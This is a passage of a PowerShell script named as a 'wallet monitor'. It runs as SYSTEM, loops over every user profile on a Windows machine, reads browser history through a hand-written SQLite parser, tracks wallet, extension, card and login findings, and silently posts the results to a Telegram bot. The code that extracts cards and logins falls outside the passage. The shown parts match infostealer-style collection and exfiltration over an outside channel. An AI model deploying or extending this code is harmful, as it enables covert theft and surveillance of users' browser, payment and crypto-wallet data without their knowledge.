}

# =====================================================================
#  3)  Base paths
# =====================================================================

$Script:ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
if (-not $Script:ScriptDir) { $Script:ScriptDir = (Get-Location).Path }

$Script:ConfigFile = ''
if ($ConfigPath) {
    if (-not [System.IO.Path]::IsPathRooted($ConfigPath)) { $ConfigPath = Join-Path $Script:ScriptDir $ConfigPath }
    $Script:ConfigFile = [System.IO.Path]::GetFullPath($ConfigPath)
}

$Script:ConfigDir  = ''
if ($Script:ConfigFile) { $Script:ConfigDir = Split-Path -Parent $SCRIPT:ConfigFile }
if (-not $Script:ConfigDir) { $Script:ConfigDir = $Script:ScriptDir }

$Script:HostLabel  = $env:COMPUTERNAME
if ([string]::IsNullOrWhiteSpace($Script:HostLabel)) {
    try { $Script:HostLabel = [System.Net.Dns]::GetHostName() } catch { $Script:HostLabel = '' }
}
if ([string]::IsNullOrWhiteSpace($Script:HostLabel)) { $Script:HostLabel = 'UnknownHost' }
$Script:RunErrors  = New-Object System.Collections.ArrayList
$Script:FoundItems = New-Object System.Collections.ArrayList
$Script:NewItems   = New-Object System.Collections.ArrayList
$Script:SentCount  = 0
$Script:HistoryHits = @()
$Script:NewHistoryCount = 0
$Script:HistoryStats = @()
$Script:HistoryBrowsers = 0
$Script:CardStats = @()
$Script:LoginStats = @()

# =====================================================================
#  4)  General helper functions
# =====================================================================

function Get-Prop {
    # Important note: PowerShell "unrolls" arrays when they are returned from functions, so any call
    # that expects an array must be wrapped with @(...)  ->  @(Get-Prop ...)
    param($Object, [string]$Name, $Default = $null)
    if ($null -eq $Object) { return $Default }
    if ($Object -is [System.Collections.IDictionary]) {
        if (-not $Object.Contains($Name)) { return $Default }
        $v = $Object[$Name]
        if ($null -eq $v) { return $Default }
        return $v
    }
    $p = $Object.PSObject.Properties[$Name]
    if ($null -eq $p) { return $Default }
    if ($null -eq $p.Value) { return $Default }
    return $p.Value
}

function Set-CfgValue {
    param($Object, [string]$Name, $Value)
    if ($Object -is [System.Collections.IDictionary]) { $Object[$Name] = $Value; return }
    $Object | Add-Member -NotePropertyName $Name -NotePropertyValue $Value -Force
}

function Merge-Config {
    <# Merge an external JSON file over the embedded config (optional via -ConfigPath) #>
    param($Base, $Over)
    if ($null -eq $Over) { return }
    if ($Over -is [System.Collections.IDictionary]) {
        foreach ($k in $Over.Keys) {
            if ($Base.Contains($k) -and ($Base[$k] -is [System.Collections.IDictionary]) -and ($Over[$k] -is [System.Collections.IDictionary])) {
                Merge-Config $Base[$k] $Over[$k]
            } else {
                $Base[$k] = $Over[$k]
            }
        }
        return
    }
    foreach ($p in $Over.PSObject.Properties) {
        $k = $p.Name
        if ($Base.Contains($k) -and ($Base[$k] -is [System.Collections.IDictionary]) -and ($p.Value -isnot [string]) -and ($p.Value -isnot [int]) -and ($p.Value -isnot [bool]) -and $p.Value) {
            Merge-Config $Base[$k] $p.Value
        } else {
            $Base[$k] = $p.Value
        }
    }
}

function Read-JsonFile {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { throw "File not found: $Path" }
    $raw = [System.IO.File]::ReadAllText($Path, [System.Text.Encoding]::UTF8)
    if ([string]::IsNullOrWhiteSpace($raw)) { throw "File is empty: $Path" }
    return ($raw | ConvertFrom-Json)
}

function Write-JsonFile {
    param([string]$Path, $Object, [int]$Depth = 12)
    $json = $Object | ConvertTo-Json -Depth $Depth
    $dir = Split-Path -Parent $Path
    if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    [System.IO.File]::WriteAllText($Path, $json, (New-Object System.Text.UTF8Encoding($false)))
}

function Expand-PathString {
    param([string]$Path)
    if ([string]::IsNullOrWhiteSpace($Path)) { return $Path }
    return [System.Environment]::ExpandEnvironmentVariables($Path)
}

function Test-SystemContext {
    <# True when the process runs as NT AUTHORITY\SYSTEM (typical for a scheduled task
       configured to run "whether user is logged on or not"). #>
    try {
        $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        if ($null -ne $id -and $id.IsSystem) { return $true }
    } catch { }
    $up = [string]$env:USERPROFILE
    if ($up -and $up -like '*\systemprofile') { return $true }
    $un = [string]$env:USERNAME
    if ([string]::IsNullOrWhiteSpace($un)) { return $true }
    if ($un -eq 'SYSTEM' -or $un -eq 'SYSTEM$' -or $un -like 'NT AUTHORITY*') { return $true }
    return $false
}

function Test-ProfileContext {
    <# True when the environment points at one concrete user profile (interactive session
       or a per-user relaunch such as ScanAllUsers.ps1), so no multi-profile fan-out is
       needed: the leaf of USERPROFILE matches USERNAME and the profile has an AppData dir. #>
    $up = [string]$env:USERPROFILE
    $un = [string]$env:USERNAME
    if ([string]::IsNullOrWhiteSpace($up) -or [string]::IsNullOrWhiteSpace($un)) { return $false }
    $trim = ''; $leaf = ''; $parent = ''
    try {
        $trim   = ([string]$up).TrimEnd('\', '/')
        $leaf   = [System.IO.Path]::GetFileName($trim)
        $parent = [System.IO.Path]::GetDirectoryName($trim)
    } catch { return $false }
    if ([string]::IsNullOrWhiteSpace($leaf) -or $leaf -ne $un) { return $false }
    if ([string]::IsNullOrWhiteSpace($parent)) { return $false }
    if (-not (Test-Path -LiteralPath (Join-Path $trim 'AppData'))) { return $false }
    return $true
}

function Get-RealUserProfiles {
    <# Real interactive user profile directories under <SystemDrive>\Users (or
       $env:WM_USERS_ROOT when set - used by the self-tests). Public/template/service
       profiles and dot-directories are skipped; a profile must contain an AppData dir. #>
    $root = [string]$env:WM_USERS_ROOT
    if ([string]::IsNullOrWhiteSpace($root)) {
        $drive = [string]$env:SystemDrive
        if ([string]::IsNullOrWhiteSpace($drive)) { $drive = 'C:' }
        $root = Join-Path $drive '\Users'
    }
    if (-not (Test-Path -LiteralPath $root)) { return @() }
    $skip = @('Public', 'Default', 'Default User', 'All Users', 'DefaultAppPool', 'systemprofile')
    $out  = New-Object System.Collections.ArrayList
    foreach ($d in @(Get-ChildItem -LiteralPath $root -Directory -ErrorAction SilentlyContinue)) {
        $n = [string]$d.Name
        if ([string]::IsNullOrWhiteSpace($n)) { continue }
        if ($n.StartsWith('.')) { continue }
        if ($skip -contains $n) { continue }
        if (-not (Test-Path -LiteralPath (Join-Path $d.FullName 'AppData'))) { continue }
        [void]$out.Add($d.FullName)
    }
    return @($out)
}

function Invoke-ForEachProfile {
    <# Runs $Body once for the current profile. In SYSTEM context it runs $Body once per
       real user profile on the machine, temporarily redirecting USERPROFILE / APPDATA /
       LOCALAPPDATA / TEMP / TMP / USERNAME, so the browser data of every user is scanned
       without any external wrapper script. Environment variables are always restored. #>
    param([scriptblock]$Body)
    if (-not $Body) { return }

    if (Test-ProfileContext) { & $Body; return }
    if (-not (Test-SystemContext)) { & $Body; return }

    $profiles = @(Get-RealUserProfiles)
    if ($profiles.Count -eq 0) {
        Write-Log 'SYSTEM context: no real user profiles found under the Users folder; scanning the current environment.' 'WARN'
        & $Body
        return
    }

    Write-Log "SYSTEM context: scanning $($profiles.Count) user profile(s)."
    $names = @('USERPROFILE', 'APPDATA', 'LOCALAPPDATA', 'TEMP', 'TMP', 'USERNAME')
    $saved = @{}
    foreach ($n in $names) { $saved[$n] = [string][Environment]::GetEnvironmentVariable($n) }

    foreach ($p in $profiles) {
        $user = ''
        try { $user = [System.IO.Path]::GetFileName(([string]$p).TrimEnd('\', '/')) } catch { }
        try {
            $appData   = Join-Path $p 'AppData'
            $adRoaming = Join-Path $appData 'Roaming'
            $adLocal   = Join-Path $appData 'Local'
            $tmp       = Join-Path $adLocal 'Temp'
            if (-not (Test-Path -LiteralPath $tmp)) { $tmp = [System.IO.Path]::GetTempPath() }
            [Environment]::SetEnvironmentVariable('USERPROFILE', $p, 'Process')
            [Environment]::SetEnvironmentVariable('APPDATA', $adRoaming, 'Process')
            [Environment]::SetEnvironmentVariable('LOCALAPPDATA', $adLocal, 'Process')
            [Environment]::SetEnvironmentVariable('TEMP', $tmp, 'Process')
            [Environment]::SetEnvironmentVariable('TMP', $tmp, 'Process')
            if ($user) { [Environment]::SetEnvironmentVariable('USERNAME', $user, 'Process') }
            Write-Log "SYSTEM context: scanning profile '$user'..."
            & $Body
        } catch {
            Add-Error "Scan of profile '$user' failed: $($_.Exception.Message)"
            Write-Log "Scan of profile '$user' failed: $($_.Exception.Message)" 'ERROR'
        } finally {
            foreach ($n in $names) {
                [Environment]::SetEnvironmentVariable($n, [string]$saved[$n], 'Process')
            }
        }
    }
}

function Add-Error {
    param([string]$Message)
    [void]$Script:RunErrors.Add($Message)
}

function Get-Sha256Short {
    param([string]$Text)
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $bytes = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Text))
        return ([BitConverter]::ToString($bytes) -replace '-', '').Substring(0, 40)
    } finally { $sha.Dispose() }
}

function ConvertTo-HtmlSafe {
    param([string]$Text)
    if ([string]::IsNullOrEmpty($Text)) { return '' }
    $t = $Text -replace '&', '&amp;'
    $t = $t -replace '<', '&lt;'
    $t = $t -replace '>', '&gt;'
    return $t
}

function Limit-Text {
    param([string]$Text, [int]$Max = 200)
    if ([string]::IsNullOrEmpty($Text)) { return '' }
    $t = $Text.Trim()
    if ($t.Length -le $Max) { return $t }
    return $t.Substring(0, [Math]::Max(1, $Max - 3)) + '...'
}

function Get-MatchedKeyword {
    param([string]$Text, [string[]]$Keywords)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $null }
    foreach ($kw in $Keywords) {
        if ([string]::IsNullOrWhiteSpace($kw)) { continue }
        if ($Text.IndexOf($kw, [System.StringComparison]::OrdinalIgnoreCase) -ge 0) { return $kw }
    }
    return $null
}

# =====================================================================
#  5)  Logging
# =====================================================================

function Initialize-Log {
    $logName = [string](Get-Prop (Get-Prop $Script:Cfg 'paths') 'log_file' 'wallet-monitor.log')
    if (-not [System.IO.Path]::IsPathRooted($logName)) { $logName = Join-Path $Script:ConfigDir $logName }
    $Script:LogFile = $logName
    $Script:LogMaxBytes = [int](Get-Prop (Get-Prop $Script:Cfg 'paths') 'log_max_bytes' 5242880)
    $dir = Split-Path -Parent $Script:LogFile
    if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
}

function Rotate-LogIfNeeded {
    if (-not $Script:LogFile) { return }
    try {
        if (Test-Path -LiteralPath $Script:LogFile) {
            $fi = Get-Item -LiteralPath $Script:LogFile -ErrorAction Stop
            if ($fi.Length -gt $Script:LogMaxBytes) {
                $bak = "$($Script:LogFile).old"
                if (Test-Path -LiteralPath $bak) { Remove-Item -LiteralPath $bak -Force -ErrorAction SilentlyContinue }
                Move-Item -LiteralPath $Script:LogFile -Destination $bak -Force -ErrorAction SilentlyContinue
            }
        }
    } catch { }
}

function Write-Console {
    <# Write to the screen only in console mode (or admin commands). #>
    param([string]$Message, [string]$Color = '')
    if (-not $Script:ConsoleMode) { return }
    if ($Color) { Write-Host $Message -ForegroundColor $Color } else { Write-Host $Message }
}

function Write-Log {
    param([string]$Message, [ValidateSet('INFO', 'WARN', 'ERROR', 'DEBUG')][string]$Level = 'INFO')
    $ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    $line = "[$ts] [$Level] $Message"
    # Silent mode: nothing on screen except in console mode
    if ($Script:ConsoleMode) {
        switch ($Level) {
            'ERROR' { Write-Host $line -ForegroundColor Red }
            'WARN'  { Write-Host $line -ForegroundColor Yellow }
            'DEBUG' { Write-Verbose $line }
            default { Write-Host $line }
        }
    }
    if ($Script:LogFile) {
        try { [System.IO.File]::AppendAllText($Script:LogFile, $line + "`r`n", (New-Object System.Text.UTF8Encoding($false))) }
        catch { }
    }
}

# =====================================================================
#  6)  Telegram
# =====================================================================

function Initialize-Telegram {
    $tg = Get-Prop $Script:Cfg 'telegram' $null
    $Script:BotToken = [string](Get-Prop $tg 'bot_token' '')
    $Script:ChatId   = [string](Get-Prop $tg 'chat_id' '')

    # Environment variables take priority (safer than storing the token in the file)
    if ($env:WALLETMON_BOT_TOKEN) { $Script:BotToken = $env:WALLETMON_BOT_TOKEN }
    if ($env:WALLETMON_CHAT_ID)   { $Script:ChatId   = $env:WALLETMON_CHAT_ID }

    $Script:RateLimitMs    = [int](Get-Prop $tg 'rate_limit_ms' 400)
    $Script:MaxPerRun      = [int](Get-Prop $tg 'max_notifications_per_run' 50)
    $Script:NotifyOnError  = [bool](Get-Prop $tg 'notify_on_error' $true)

    if ([string]::IsNullOrWhiteSpace($Script:BotToken) -or $Script:BotToken -like 'PUT_YOUR*') {
        Write-Log 'bot_token is not set (embedded config or WALLETMON_BOT_TOKEN). Notifications are disabled.' 'WARN'
        $Script:BotToken = ''
    }
    if ([string]::IsNullOrWhiteSpace($Script:ChatId) -or $Script:ChatId -like 'PUT_YOUR*') {
        Write-Log 'chat_id is not set (embedded config or WALLETMON_CHAT_ID). Notifications are disabled.' 'WARN'
        $Script:ChatId = ''
    }
}

function Send-TelegramMessage {
    <# Sends a single message. Returns $true/$false. Does not log the token. #>
    param(
        [Parameter(Mandatory = $true)][string]$Text,
        [switch]$Force
    )

    if ($NoNotify -and -not $Force) { return $false }
    if (-not $Script:BotToken -or -not $Script:ChatId) { return $false }

    $body = @{
        chat_id                  = $Script:ChatId
        text                     = $Text
        parse_mode               = 'HTML'
        disable_web_page_preview = $true
    }

    $url = "https://api.telegram.org/bot$($Script:BotToken)/sendMessage"

    for ($attempt = 1; $attempt -le 3; $attempt++) {
        try {
            $resp = Invoke-RestMethod -Uri $url -Method Post -Body $body -TimeoutSec 25 -ErrorAction Stop
            if ($resp.ok) {
                if ($Script:RateLimitMs -gt 0) { Start-Sleep -Milliseconds $Script:RateLimitMs }
                return $true
            }
            Write-Log "Telegram rejected the message: $($resp.description)" 'ERROR'
            return $false
        }
        catch {
            $msg = $_.Exception.Message
            if ($attempt -lt 3) {
                Start-Sleep -Seconds (2 * $attempt)
                continue
            }
            Write-Log "Failed to send Telegram notification after 3 attempts: $msg" 'ERROR'
            return $false
        }
    }
    return $false
}

# =====================================================================
#  7)  State (prevents duplicate notifications)
# =====================================================================

function Initialize-State {
    $stateName = [string](Get-Prop (Get-Prop $Script:Cfg 'paths') 'state_file' 'state.json')
    if (-not [System.IO.Path]::IsPathRooted($stateName)) { $stateName = Join-Path $Script:ConfigDir $stateName }
    $Script:StateFile = $stateName

    $Script:State = [PSCustomObject]@{
        version          = 2
        last_run         = ''
        last_summary_date = ''
        last_report_ts   = ''
        card_sig         = ''
        login_sigs       = @()
        card_sigs        = @()
        history_ts       = @()
        seen             = @()
        daily            = @()
    }

    if ((Test-Path -LiteralPath $Script:StateFile) -and -not $ResetState) {
        try {
            $loaded = Read-JsonFile $Script:StateFile
            if ($loaded) { $Script:State = $loaded }
        } catch {
            Write-Log "Could not read state.json; a new file will be created: $($_.Exception.Message)" 'WARN'
        }
    }

    $Script:State.seen  = [System.Collections.ArrayList]@(@($Script:State.seen)  | Where-Object { $_ -and $_.key })
    $Script:State.daily = [System.Collections.ArrayList]@(@($Script:State.daily) | Where-Object { $_ -and $_.date })
    # Add-Member -Force also creates the property on a state.json written by an older version.
    $Script:State | Add-Member -NotePropertyName login_sigs -NotePropertyValue ([System.Collections.ArrayList]@(@($Script:State.login_sigs) | Where-Object { $_ -and $_.user })) -Force
    $Script:State | Add-Member -NotePropertyName card_sigs -NotePropertyValue ([System.Collections.ArrayList]@(@($Script:State.card_sigs) | Where-Object { $_ -and $_.user })) -Force
    $Script:State | Add-Member -NotePropertyName history_ts -NotePropertyValue ([System.Collections.ArrayList]@(@($Script:State.history_ts) | Where-Object { $_ -and $_.user })) -Force

    $Script:SeenSet = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
    foreach ($s in @($Script:State.seen)) {
        if ($null -ne $s -and $s.key) { [void]$Script:SeenSet.Add([string]$s.key) }
    }
    Write-Log "Items stored in state: $($Script:SeenSet.Count)"
}

function Save-State {
    try {
        $seenArr = @($Script:State.seen)
        if ($seenArr.Count -gt 6000) { $seenArr = $seenArr[($seenArr.Count - 6000)..($seenArr.Count - 1)] }
        $Script:State.seen = [System.Collections.ArrayList]$seenArr

        $dailyArr = @($Script:State.daily)
        if ($dailyArr.Count -gt 60) { $dailyArr = $dailyArr[($dailyArr.Count - 60)..($dailyArr.Count - 1)] }
        $Script:State.daily = [System.Collections.ArrayList]$dailyArr

        $Script:State.last_run = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        Write-JsonFile -Path $Script:StateFile -Object $Script:State
    } catch {
        Write-Log "Could not save state.json: $($_.Exception.Message)" 'ERROR'
    }
}

function Register-Finding {
    <#
        Records a result. Returns $true if this is the first time we see it.
        -Silent: records into state (to prevent duplicates) but does not add it to the immediate-send list.
    #>
    param(
        [ValidateSet('desktop', 'extension', 'history', 'file', 'card')][string]$Type,
        [string]$Key,
        [string]$Label,
        [string]$Message,
        [switch]$Silent
    )

    $hash = Get-Sha256Short "$Type|$Key"
    [void]$Script:FoundItems.Add([PSCustomObject]@{ Type = $Type; Key = $Key; Label = $Label; Hash = $hash })

    if ($Script:SeenSet.Contains($hash)) { return $false }

    [void]$Script:SeenSet.Add($hash)
    [void]$Script:State.seen.Add([PSCustomObject]@{
        key        = $hash
        type       = $Type
        label      = (Limit-Text $Label 120)
        first_seen = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    })

    if (-not $Silent) {
        [void]$Script:NewItems.Add([PSCustomObject]@{ Type = $Type; Label = $Label; Message = $Message })
    }
    return $true
}

function Add-DailyCounter {
    param([string]$Type, [int]$Increment = 1)
    $today = (Get-Date).ToString('yyyy-MM-dd')
    $entry = $null
    foreach ($d in $Script:State.daily) { if ($d.date -eq $today) { $entry = $d; break } }
    if (-not $entry) {
        $entry = [PSCustomObject]@{ date = $today; desktop = 0; extension = 0; history = 0; file = 0; card = 0 }
        [void]$Script:State.daily.Add($entry)
    }
    $cur = [int](Get-Prop $entry $Type 0)
    Set-CfgValue $entry $Type ($cur + $Increment)
}

# =====================================================================
#  8)  Pure-PowerShell SQLite reader (no Python / no DLL)
#      Reads B-Tree tables directly from browser files (urls / moz_places)
#      With overflow-page reassembly. Read-only; it modifies no file.
# =====================================================================

function Read-BE {
    param([byte[]]$B, [int]$O, [int]$N)
    $v = [long]0
    for ($i = 0; $i -lt $N; $i++) { $v = ($v -shl 8) -bor [long]$B[$O + $i] }
    return $v
}

function Read-Varint {
    param([byte[]]$B, [int]$O, [ref]$Len)
    $v = [long]0
    for ($i = 0; $i -lt 9; $i++) {
        $c = [int]$B[$O + $i]
        if ($i -eq 8) { $v = ($v -shl 8) -bor [long]$c; $Len.Value = 9; return $v }
        $v = ($v -shl 7) -bor [long]($c -band 0x7F)
        if (($c -band 0x80) -eq 0) { $Len.Value = $i + 1; return $v }
    }
    $Len.Value = 9
    return $v
}

function Read-SqliteRecord {
    param([byte[]]$Payload, [System.Text.Encoding]$Enc)
    $n = 0
    $hdrSize = Read-Varint $Payload 0 ([ref]$n)
    $types = New-Object System.Collections.Generic.List[long]
    $pos = $n
    while ($pos -lt $hdrSize) {
        $m = 0
        $tp = Read-Varint $Payload $pos ([ref]$m)
        $types.Add($tp)
        $pos += $m
    }
    $body = [int]$hdrSize
    $vals = New-Object System.Collections.Generic.List[object]
    foreach ($tp in $types) {
        $sz = 0
        $val = $null
        if ($tp -eq 0) { $sz = 0; $val = $null }
        elseif ($tp -eq 1) { $sz = 1; $val = [long](Read-BE $Payload $body 1) }
        elseif ($tp -eq 2) { $sz = 2; $val = [long](Read-BE $Payload $body 2) }
        elseif ($tp -eq 3) { $sz = 3; $val = [long](Read-BE $Payload $body 3) }
        elseif ($tp -eq 4) { $sz = 4; $val = [long](Read-BE $Payload $body 4) }
        elseif ($tp -eq 5) { $sz = 6; $val = [long](Read-BE $Payload $body 6) }
        elseif ($tp -eq 6) { $sz = 8; $val = [long](Read-BE $Payload $body 8) }
        elseif ($tp -eq 7) {
            $sz = 8
            $bits = [long](Read-BE $Payload $body 8)
            $val = [System.BitConverter]::Int64BitsToDouble($bits)
        }
        elseif ($tp -eq 8) { $sz = 0; $val = [long]0 }
        elseif ($tp -eq 9) { $sz = 0; $val = [long]1 }
        elseif ($tp -eq 10 -or $tp -eq 11) { $sz = 0; $val = $null }
        elseif (($tp % 2) -eq 0) {
            $sz = [int](($tp - 12) / 2)
            $val = New-Object byte[] $sz
            [Array]::Copy($Payload, $body, $val, 0, $sz)
        }
        else {
            $sz = [int](($tp - 13) / 2)
            $val = $Enc.GetString($Payload, $body, $sz)
        }
        $body += $sz
        $vals.Add($val)
    }
    return , $vals.ToArray()
}

function Read-PayloadLocal {
    # Returns a byte[] of length X after reassembling the overflow-page chain.
    param([byte[]]$B, [int]$Start, [long]$X, [int]$PageSize, [int]$Usable, [int]$TotalPages)
    $maxLocal = $Usable - 35
    $minLocal = [int][math]::Floor(((($Usable - 12) * 32) / 255)) - 23
    if ($X -le $maxLocal) { $local = [int]$X }
    else {
        $k = $minLocal + (($X - $minLocal) % ($Usable - 4))
        if ($k -le $maxLocal) { $local = [int]$k } else { $local = $minLocal }
    }
    $out = New-Object byte[] ([int]$X)
    [Array]::Copy($B, $Start, $out, 0, $local)
    $got = $local
    $remaining = $X - $local
    $ptrOff = $Start + $local
    $guard = 0
    while ($remaining -gt 0 -and $guard -lt 1000000) {
        $guard++
        $nextPage = [long](Read-BE $B $ptrOff 4)
        if ($nextPage -le 0 -or $nextPage -gt $TotalPages) { break }
        $pg = [int](($nextPage - 1) * $PageSize)
        $chunk = [int][math]::Min([long]($Usable - 4), $remaining)
        [Array]::Copy($B, $pg + 4, $out, $got, $chunk)
        $got += $chunk
        $remaining -= $chunk
        $ptrOff = $pg
    }
    return $out
}

function Get-SqlitePageInfo {
    param([byte[]]$B, [int]$PageNum, [int]$PageSize, [int]$Usable)
    $base = ($PageNum - 1) * $PageSize
    $hdr = $base
    if ($PageNum -eq 1) { $hdr = $base + 100 }
    $type = [int]$B[$hdr]
    $nCell = [int](Read-BE $B ($hdr + 3) 2)
    $hdrSize = 8
    $rightPtr = 0
    if ($type -eq 2 -or $type -eq 5) {
        $hdrSize = 12
        $rightPtr = [int](Read-BE $B ($hdr + 8) 4)
    }
    return @{ Base = $base; Hdr = $hdr; Type = $type; NCell = $nCell; HdrSize = $hdrSize; RightPtr = $rightPtr; PtrArray = $hdr + $hdrSize }
}

function Walk-TableBtree {
    param([byte[]]$B, [int]$PageNum, [int]$PageSize, [int]$Usable, [int]$TotalPages,
        [System.Text.Encoding]$Enc, [System.Collections.Generic.List[object]]$Rows, [int]$Depth = 0)
    if ($PageNum -le 0 -or $PageNum -gt $TotalPages -or $Depth -gt 64) { return }
    $info = Get-SqlitePageInfo $B $PageNum $PageSize $Usable
    if ($info.Type -eq 13) {
        for ($i = 0; $i -lt $info.NCell; $i++) {
            $cellOff = [int](Read-BE $B ($info.PtrArray + $i * 2) 2)
            $c = $info.Base + $cellOff
            $pl = 0
            $payloadLen = Read-Varint $B $c ([ref]$pl)
            $rl = 0
            $null = Read-Varint $B ($c + $pl) ([ref]$rl)
            $payload = Read-PayloadLocal $B ($c + $pl + $rl) $payloadLen $PageSize $Usable $TotalPages
            $Rows.Add((Read-SqliteRecord $payload $Enc))
        }
    }
    elseif ($info.Type -eq 5) {
        for ($i = 0; $i -lt $info.NCell; $i++) {
            $cellOff = [int](Read-BE $B ($info.PtrArray + $i * 2) 2)
            $child = [long](Read-BE $B ($info.Base + $cellOff) 4)
            Walk-TableBtree $B ([int]$child) $PageSize $Usable $TotalPages $Enc $Rows ($Depth + 1)
        }
        if ($info.RightPtr -ne 0) { Walk-TableBtree $B $info.RightPtr $PageSize $Usable $TotalPages $Enc $Rows ($Depth + 1) }
    }
}

function Get-SqliteColumnsFromSql {
    <# Extracts column names from the CREATE TABLE statement stored in sqlite_master. #>
    param([string]$Sql)
    $cols = New-Object System.Collections.Generic.List[string]
    if ([string]::IsNullOrWhiteSpace($Sql)) { return @($cols.ToArray()) }
    $open = $Sql.IndexOf('(')
    $close = $Sql.LastIndexOf(')')
    if ($open -lt 0 -or $close -le $open) { return @($cols.ToArray()) }
    $inner = $Sql.Substring($open + 1, $close - $open - 1)
    $parts = New-Object System.Collections.Generic.List[string]
    $depth = 0; $cur = ''
    foreach ($ch in $inner.ToCharArray()) {
        if ($ch -eq '(' -or $ch -eq '[') { $depth++ }
        elseif ($ch -eq ')' -or $ch -eq ']') { $depth-- }
        if ($ch -eq ',' -and $depth -eq 0) { $parts.Add($cur); $cur = '' } else { $cur += $ch }
    }
    $parts.Add($cur)
    foreach ($p in $parts) {
        $tt = $p.Trim().Trim('"', '[', ']', '`')
        if ($tt.Length -eq 0) { continue }
        $name = ($tt -split '\s+')[0].Trim('"', '[', ']', '`')
        $up = $name.ToUpperInvariant()
        if ($up -in @('PRIMARY', 'UNIQUE', 'CHECK', 'FOREIGN', 'CONSTRAINT')) { continue }
        $cols.Add($name)
    }
    return @($cols.ToArray())
}

function Get-SqliteInfo {
    <# Parses the file header + sqlite_master and returns the table data (without decoding any row). #>
    param([string]$Path, [string]$Table)
    $B = [System.IO.File]::ReadAllBytes($Path)
    if ($B.Length -lt 100 -or $B[0] -ne 0x53 -or $B[1] -ne 0x51) { throw "Not a valid SQLite file: $Path" }
    $pageSize = [int](Read-BE $B 16 2)
    if ($pageSize -eq 1) { $pageSize = 65536 }
    $reserved = [int]$B[20]
    $usable = $pageSize - $reserved
    $encId = [int](Read-BE $B 56 4)
    $enc = [System.Text.Encoding]::UTF8
    if ($encId -eq 2) { $enc = [System.Text.Encoding]::Unicode }
    elseif ($encId -eq 3) { $enc = [System.Text.Encoding]::BigEndianUnicode }
    $totalPages = [int][math]::Floor($B.Length / $pageSize)

    $master = New-Object System.Collections.Generic.List[object]
    Walk-TableBtree $B 1 $pageSize $usable $totalPages $enc $master

    $rootPage = 0
    $sql = $null
    foreach ($r in $master) {
        if ($r.Count -ge 5 -and "$($r[1])" -eq $Table) { $rootPage = [int]$r[3]; $sql = "$($r[4])" }
    }
    return @{
        Bytes      = $B
        PageSize   = $pageSize
        Usable     = $usable
        TotalPages = $totalPages
        Enc        = $enc
        RootPage   = $rootPage
        Sql        = $sql
    }
}

function Get-SqliteTableData {
    param([string]$Path, [string]$Table)
    $info = Get-SqliteInfo -Path $Path -Table $Table
    if ($info.RootPage -eq 0) { return @{ Columns = @(); Rows = @() } }
    $rows = New-Object System.Collections.Generic.List[object]
    Walk-TableBtree $info.Bytes $info.RootPage $info.PageSize $info.Usable $info.TotalPages $info.Enc $rows
    return @{ Columns = @(Get-SqliteColumnsFromSql $info.Sql); Rows = $rows.ToArray() }
}

function Get-SqliteLeafRefs {
    <# Collects payload offsets/sizes in leaf pages only (without decoding any value). #>
    param([byte[]]$B, [int]$PageNum, [int]$PageSize, [int]$Usable, [int]$TotalPages,
        [System.Collections.Generic.List[object]]$Refs, [int]$Depth = 0)
    if ($PageNum -le 0 -or $PageNum -gt $TotalPages -or $Depth -gt 64) { return }
    $info = Get-SqlitePageInfo $B $PageNum $PageSize $Usable
    if ($info.Type -eq 13) {
        for ($i = 0; $i -lt $info.NCell; $i++) {
            $cellOff = [int](Read-BE $B ($info.PtrArray + $i * 2) 2)
            $c = $info.Base + $cellOff
            $pl = 0
            $payloadLen = Read-Varint $B $c ([ref]$pl)
            $rl = 0
            $null = Read-Varint $B ($c + $pl) ([ref]$rl)
            $Refs.Add(@{ Off = [long]($c + $pl + $rl); Len = [long]$payloadLen })
        }
    }
    elseif ($info.Type -eq 5) {
        for ($i = 0; $i -lt $info.NCell; $i++) {
            $cellOff = [int](Read-BE $B ($info.PtrArray + $i * 2) 2)
            $child = [long](Read-BE $B ($info.Base + $cellOff) 4)
            Get-SqliteLeafRefs $B ([int]$child) $PageSize $Usable $TotalPages $Refs ($Depth + 1)
        }
        if ($info.RightPtr -ne 0) { Get-SqliteLeafRefs $B $info.RightPtr $PageSize $Usable $TotalPages $Refs ($Depth + 1) }
    }
}

function Get-SqliteRowCount {
    <# Counts table rows by counting leaf-page cells only — without reading any payload. #>
    param([byte[]]$B, [int]$PageNum, [int]$PageSize, [int]$Usable, [int]$TotalPages, [int]$Depth = 0)
    if ($PageNum -le 0 -or $PageNum -gt $TotalPages -or $Depth -gt 64) { return 0 }
    $info = Get-SqlitePageInfo $B $PageNum $PageSize $Usable
    if ($info.Type -eq 13) { return [int]$info.NCell }
    if ($info.Type -eq 5) {
        $n = 0
        for ($i = 0; $i -lt $info.NCell; $i++) {
            $cellOff = [int](Read-BE $B ($info.PtrArray + $i * 2) 2)
            $child = [long](Read-BE $B ($info.Base + $cellOff) 4)
            $n += Get-SqliteRowCount $B ([int]$child) $PageSize $Usable $TotalPages ($Depth + 1)
        }
        if ($info.RightPtr -ne 0) { $n += Get-SqliteRowCount $B $info.RightPtr $PageSize $Usable $TotalPages ($Depth + 1) }
        return $n
    }
    return 0
}

function Get-SqliteColumnValues {
    <# Reads a single text column by name; the other columns are skipped byte-by-byte without decoding or copying. #>
    param([string]$Path, [string]$Table, [string]$Column)
    $out = New-Object System.Collections.Generic.List[string]
    $info = Get-SqliteInfo -Path $Path -Table $Table
    if ($info.RootPage -eq 0) { return $out }
    $cols = @(Get-SqliteColumnsFromSql $info.Sql)
    $idx = -1
    for ($i = 0; $i -lt $cols.Count; $i++) {
        if ([string]$cols[$i] -ieq $Column) { $idx = $i; break }
    }
    if ($idx -lt 0) { return $out }

    $refs = New-Object System.Collections.Generic.List[object]
    Get-SqliteLeafRefs $info.Bytes $info.RootPage $info.PageSize $info.Usable $info.TotalPages $refs

    foreach ($r in $refs) {
